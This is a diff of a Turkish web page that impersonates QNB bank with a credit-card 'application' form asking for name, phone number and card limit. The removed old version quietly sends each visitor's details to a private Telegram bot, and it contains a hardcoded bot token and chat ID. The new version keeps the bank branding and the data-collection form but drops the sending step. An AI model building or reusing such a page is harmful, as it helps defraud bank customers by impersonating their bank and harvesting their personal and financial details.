@@ -1,167 +1,256 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
   <title>QNB Başvuru</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom right, #2e0d7b, #0073cf);
+      background-color: #fdfdfd;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      background: linear-gradient(to right, #0d0c34, #56003c);
+      padding: 5px 20px; /* yukarı aşağı biraz daha az boşluk */
       display: flex;
-      flex-direction: column;
       align-items: center;
-      height: 100vh;
-      color: white;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      flex: 1;
-      justify-content: center;
-    }
-    .logo {
-      width: 120px;
-      margin-bottom: 20px;
-    }
-    .card {
-      background: rgba(255, 255, 255, 0.05);
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-      width: 360px;
-      backdrop-filter: blur(10px);
-      display: none;
-    }
-    .card.active {
-      display: block;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    .form-group label {
-      display: block;
-      margin-bottom: 5px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: none;
-      font-size: 14px;
+      height: 50px; /* yükseklik sabitlendi */
       box-sizing: border-box;
     }
-    .submit-btn {
-      width: 100%;
-      padding: 14px;
-      background: #3d0066;
-      color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 10px;
+
+    .header img {
+      height: 40px;
       cursor: pointer;
-      margin-top: 10px;
     }
-    .checkmark {
-      font-size: 48px;
-      color: #00cc66;
-      text-align: center;
-      margin-bottom: 10px;
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      border-radius: 8px;
+      border: 1px solid #eee;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
     }
-    .summary-box {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      border-radius: 10px;
+
+    label {
+      font-weight: bold;
+      display: block;
       margin-top: 20px;
     }
-    .summary-box p {
-      margin: 6px 0;
+
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+      font-size: 16px;
     }
-    .summary-box strong {
-      display: inline-block;
-      width: 130px;
+
+    .choice-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+
+    .choice-buttons input[type="radio"] {
+      display: none;
+    }
+
+    .choice-buttons label {
+      flex: 1;
+      text-align: center;
+      padding: 12px 0;
+      margin: 0 5px;
+      background-color: #f2f2f2;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      user-select: none;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .choice-buttons input[type="radio"]:checked + label {
+      background-color: #880e4f;
+      color: white;
+      border-color: #880e4f;
+    }
+
+    .login-button {
+      width: 100%;
+      margin-top: 25px;
+      padding: 12px;
+      background-color: #880e4f;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-button:hover {
+      background-color: #6a0040;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .info, .success-box {
+      background-color: #f8f8f8;
+      padding: 10px;
+      border-left: 5px solid #880e4f;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .success-container {
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .success-container h2 {
+      color: #4CAF50;
+      margin-bottom: 10px;
+    }
+
+    .success-container p {
+      font-size: 16px;
+      margin: 8px 0;
+    }
+
+    .checkmark {
+      font-size: 60px;
+      color: #4CAF50;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- LOGO -->
-    <img src="logo.png" alt="QNB Logo" class="logo" />
 
-    <!-- ADIM 1 -->
-    <div class="card active" id="formCard">
-      <h2>Bilgilerinizi Giriniz</h2>
-      <div class="form-group">
-        <label for="name">Ad Soyad *</label>
-        <input type="text" id="name" required />
-      </div>
-      <div class="form-group">
-        <label for="phone">Telefon *</label>
-        <input type="tel" id="phone" required />
-      </div>
-      <div class="form-group">
-        <label for="limit">Kredi Kartı Limitiniz *</label>
-        <input type="text" id="limit" placeholder="Örn: 50000 ₺" required />
-      </div>
-      <button class="submit-btn" onclick="showSuccess()">DEVAM</button>
-    </div>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QNB_Finansbank_logo.svg/512px-QNB_Finansbank_logo.svg.png" alt="QNB Logo">
+  </div>
 
-    <!-- BAŞVURU TAMAMLANDI -->
-    <div class="card" id="successCard">
-      <div class="checkmark">✔️</div>
-      <h2>Başvurunuz Alındı<br/>Müşteri Temsilcimiz Sizi Arayacaktır</h2>
-      <div class="summary-box">
-        <p><strong>Ad Soyad:</strong> <span id="summaryName"></span></p>
-        <p><strong>Telefon:</strong> <span id="summaryPhone"></span></p>
-        <p><strong>Kart Limiti:</strong> <span id="summaryLimit"></span></p>
-        <p><strong>Başvuru Tarihi:</strong> <span id="summaryDate"></span></p>
+  <!-- FORM 1 -->
+  <div class="container" id="form1">
+    <form id="loginForm">
+      <label>Kredi kartı kullanıyor musunuz?</label>
+      <div class="choice-buttons">
+        <input type="radio" id="evet" name="krediKart" value="Evet">
+        <label for="evet">Evet</label>
+
+        <input type="radio" id="hayir" name="krediKart" value="Hayır">
+        <label for="hayir">Hayır</label>
       </div>
-      <button class="submit-btn" onclick="location.reload()">Yeniden Başla</button>
+
+      <label for="limit">Kart limitiniz</label>
+      <input type="number" id="limit" name="limit" placeholder="Örn: 10000 TL">
+
+      <button type="submit" class="login-button">İleri</button>
+      <div id="error" class="error"></div>
+    </form>
+  </div>
+
+  <!-- FORM 2 -->
+  <div class="container hidden" id="form2">
+    <div class="info" id="summaryInfo"></div>
+
+    <form id="secondForm">
+      <label for="isim">İsim Soyisim</label>
+      <input type="text" id="isim" name="isim" placeholder="Adınız Soyadınız">
+
+      <label for="tel">Telefon Numaranız</label>
+      <input type="tel" id="tel" name="tel" placeholder="05xxxxxxxxx">
+
+      <button type="submit" class="login-button">Gönder</button>
+      <div id="error2" class="error"></div>
+    </form>
+  </div>
+
+  <!-- ONAY EKRANI -->
+  <div class="container hidden" id="successScreen">
+    <div class="success-container">
+      <div class="checkmark">✅</div>
+      <h2>Başvurunuz Alındı!</h2>
+      <p id="finalInfo"></p>
+      <p>En kısa sürede sizinle iletişime geçilecektir.</p>
     </div>
   </div>
 
   <script>
-    function showCard(id) {
-      document.querySelectorAll('.card').forEach(card => card.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-    }
+    const form1 = document.getElementById("form1");
+    const form2 = document.getElementById("form2");
+    const successScreen = document.getElementById("successScreen");
 
-    function showSuccess() {
-      fillSummary();
-      sendToTelegram();
-      showCard("successCard");
-    }
+    const loginForm = document.getElementById("loginForm");
+    const secondForm = document.getElementById("secondForm");
+    const summaryInfo = document.getElementById("summaryInfo");
+    const finalInfo = document.getElementById("finalInfo");
 
-    function fillSummary() {
-      document.getElementById("summaryName").innerText = document.getElementById("name").value;
-      document.getElementById("summaryPhone").innerText = document.getElementById("phone").value;
-      document.getElementById("summaryLimit").innerText = document.getElementById("limit").value;
-      document.getElementById("summaryDate").innerText = new Date().toLocaleString('tr-TR');
-    }
+    let krediKartDegeri = "";
+    let limitDegeri = "";
 
-    async function sendToTelegram() {
-      const token = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c"; // GÜVENLİK: Gerçek projelerde token sunucu tarafında saklanmalıdır
-      const chat_id = "8045620328";
-      const message = 
-        "📩 *Yeni Başvuru*\n\n" +
-        "👤 Ad Soyad: " + document.getElementById("name").value + "\n" +
-        "📞 Telefon: " + document.getElementById("phone").value + "\n" +
-        "💳 Kart Limiti: " + document.getElementById("limit").value + "\n" +
-        "📅 Tarih: " + new Date().toLocaleString('tr-TR');
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
 
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      });
-    }
+      const krediKart = document.querySelector('input[name="krediKart"]:checked');
+      const limit = document.getElementById("limit").value.trim();
+      const error = document.getElementById("error");
+
+      if (!krediKart || limit === "") {
+        error.textContent = "Lütfen tüm alanları doldurun.";
+        return;
+      }
+
+      krediKartDegeri = krediKart.value;
+      limitDegeri = limit;
+
+      summaryInfo.innerHTML = `
+        <strong>Önceki Bilgiler:</strong><br>
+        Kredi Kartı Kullanımı: <strong>${krediKartDegeri}</strong><br>
+        Kart Limiti: <strong>${limitDegeri} TL</strong>
+      `;
+
+      form1.classList.add("hidden");
+      form2.classList.remove("hidden");
+    });
+
+    secondForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const isim = document.getElementById("isim").value.trim();
+      const tel = document.getElementById("tel").value.trim();
+      const error2 = document.getElementById("error2");
+
+      if (isim === "" || tel === "") {
+        error2.textContent = "Lütfen isim ve telefon numarasını girin.";
+        return;
+      }
+
+      // Gösterim bilgisi
+      finalInfo.innerHTML = `
+        <strong>İsim Soyisim:</strong> ${isim}<br>
+        <strong>Telefon:</strong> ${tel}<br>
+        <strong>Kredi Kartı:</strong> ${krediKartDegeri}<br>
+        <strong>Kart Limiti:</strong> ${limitDegeri} TL
+      `;
+
+      form2.classList.add("hidden");
+      successScreen.classList.remove("hidden");
+    });
   </script>
+
 </body>
 </html>
